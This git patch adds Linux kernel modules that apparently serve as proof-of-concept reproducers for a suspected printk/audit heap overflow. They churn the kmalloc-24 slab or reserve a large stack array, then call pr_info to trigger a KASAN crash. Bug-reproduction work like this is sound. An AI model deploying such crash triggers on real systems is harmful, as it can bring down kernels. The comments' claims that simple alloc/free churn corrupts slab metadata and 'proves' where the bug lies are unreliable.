@@ -1,0 +1,161 @@
+From 8693003d66ca8dc4c5bb7eb2ac04906e98e5e6af Mon Sep 17 00:00:00 2001
+From: Shardul Bankar <shardulsb08@gmail.com>
+Date: Fri, 27 Jun 2025 04:50:03 +0530
+Subject: [PATCH 3/3] print_stack_test: Final PoC for UAF trigger
+
+---
+ exploit_poc/004_state_corruption_poc.c | 79 ++++++++++++++++++++++++++
+ exploit_poc/005_state_corruption_poc.c | 26 +++++++++
+ exploit_poc/Makefile                   |  2 +-
+ exploit_poc/print_audit_poc.c          | 10 ++++
+ 4 files changed, 116 insertions(+), 1 deletion(-)
+ create mode 100644 exploit_poc/004_state_corruption_poc.c
+ create mode 100644 exploit_poc/005_state_corruption_poc.c
+ create mode 100644 exploit_poc/print_audit_poc.c
+
+diff --git a/exploit_poc/004_state_corruption_poc.c b/exploit_poc/004_state_corruption_poc.c
+new file mode 100644
+index 000000000000..04c8e0f0697c
+--- /dev/null
++++ b/exploit_poc/004_state_corruption_poc.c
+@@ -0,0 +1,79 @@
++// SPDX-License-Identifier: GPL-2.0
++/*
++ * Kernel State Corruption PoC for printk/audit bug
++ *
++ * This module demonstrates a state-dependent heap overflow. It first
++ * manipulates a specific slab cache through a series of allocations and
++ * frees ("hole-punching"). This creates a corrupted or fragile state in
++ * the slab allocator's metadata.
++ *
++ * It then calls pr_info(), which triggers a new allocation from the now-unstable
++ * cache, resulting in a KASAN-detected slab-out-of-bounds write.
++ *
++ * This proves the vulnerability is not in pr_info() itself, but is a latent
++ * heap corruption exposed by pr_info().
++ */
++#include <linux/init.h>
++#include <linux/module.h>
++#include <linux/slab.h>
++
++// We need an object size that will likely use the same underlying slab cache
++// as the `audit_buffer` where the crash occurred. The KASAN log said the
++// `audit_buffer` was in a cache of size 24. Let's use that.
++#define OBJECT_SIZE 24
++#define ALLOC_COUNT 10000
++
++static int __init state_corruption_poc_init(void)
++{
++	void *objects[ALLOC_COUNT] = { NULL };
++	int i;
++
++	pr_info("STATE_CORRUPTION_POC: Starting test...\n");
++
++	// Phase 1: Corrupt the state of the `kmalloc-24` slab cache.
++	pr_info("STATE_CORRUPTION_POC: Step 1: Performing %d allocations to prime the cache.\n", ALLOC_COUNT);
++	for (i = 0; i < ALLOC_COUNT; i++) {
++		objects[i] = kmalloc(OBJECT_SIZE, GFP_KERNEL);
++		if (!objects[i]) {
++			// If we run out of memory, that's okay, just proceed with what we have.
++			pr_warn("STATE_CORRUPTION_POC: Allocation failed at index %d, continuing with fewer objects.\n", i);
++			break;
++		}
++	}
++
++	pr_info("STATE_CORRUPTION_POC: Step 2: Creating holes via freeing to manipulate slab metadata.\n");
++	for (i = 0; i < ALLOC_COUNT; i++) {
++		// We can free everything or create patterns. Freeing all is a simple
++		// way to create significant churn.
++		if (objects[i]) {
++			kfree(objects[i]);
++			objects[i] = NULL;
++		}
++	}
++
++	// At this point, the slab cache's internal state is potentially fragile.
++	pr_warn("STATE_CORRUPTION_POC: Step 3: Heap state is prepared. Triggering the latent bug with pr_info().\n");
++	pr_warn("STATE_CORRUPTION_POC: Expect KASAN slab-out-of-bounds crash now...\n");
++
++	// Phase 2: Trigger the latent bug.
++	// This call to pr_info() will request an `audit_buffer` from the
++	// potentially corrupted slab cache, causing the overflow.
++	pr_info("Triggering printk/audit bug from a corrupted state.");
++
++	// If we get here, the crash did not happen.
++	pr_err("STATE_CORRUPTION_POC: KERNEL SURVIVED. The bug is not reliably reproducible with this method.\n");
++
++	return -EAGAIN;
++}
++
++static void __exit state_corruption_poc_exit(void)
++{
++	pr_info("STATE_CORRUPTION_POC: Module unloaded.\n");
++}
++
++module_init(state_corruption_poc_init);
++module_exit(state_corruption_poc_exit);
++
++MODULE_LICENSE("GPL");
++MODULE_AUTHOR("Vulnerability Researcher");
++MODULE_DESCRIPTION("PoC for State-Dependent printk/audit Heap Overflow");
+diff --git a/exploit_poc/005_state_corruption_poc.c b/exploit_poc/005_state_corruption_poc.c
+new file mode 100644
+index 000000000000..8d12a5f19e38
+--- /dev/null
++++ b/exploit_poc/005_state_corruption_poc.c
+@@ -0,0 +1,26 @@
++#include <linux/init.h>
++#include <linux/module.h>
++
++// The key is to force a large stack allocation, just like the array did.
++// We can do this with a simple volatile variable.
++#define STACK_FOOTPRINT (10000 * sizeof(void *))
++
++static int __init final_poc_init(void)
++{
++	// This volatile array forces the compiler to allocate space on the stack,
++	// mimicking the memory layout of the complex PoC without doing any work.
++	volatile char stack_eater[STACK_FOOTPRINT];
++
++	// We use this to prevent the compiler from optimizing out the array entirely.
++	stack_eater[0] = 'A';
++
++	pr_info("Final PoC: Triggering bug with controlled stack layout.\n");
++
++	return -EAGAIN;
++}
++
++static void __exit final_poc_exit(void) {}
++
++module_init(final_poc_init);
++module_exit(final_poc_exit);
++MODULE_LICENSE("GPL");
+diff --git a/exploit_poc/Makefile b/exploit_poc/Makefile
+index 90f5a338f63b..d062658c919f 100644
+--- a/exploit_poc/Makefile
++++ b/exploit_poc/Makefile
+@@ -1,4 +1,4 @@
+-obj-m += uaf_exploit_poc_v7.o
++obj-m += 005_state_corruption_poc.o
+ 
+ all:
+ 	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+diff --git a/exploit_poc/print_audit_poc.c b/exploit_poc/print_audit_poc.c
+new file mode 100644
+index 000000000000..838414539bf9
+--- /dev/null
++++ b/exploit_poc/print_audit_poc.c
+@@ -0,0 +1,10 @@
++#include <linux/init.h>
++#include <linux/module.h>
++static int __init new_poc_init(void) {
++    pr_info("Triggering the printk/audit bug\n");
++    return -EAGAIN;
++}
++static void __exit new_poc_exit(void) {}
++module_init(new_poc_init);
++module_exit(new_poc_exit);
++MODULE_LICENSE("GPL");
+-- 
+2.34.1
+
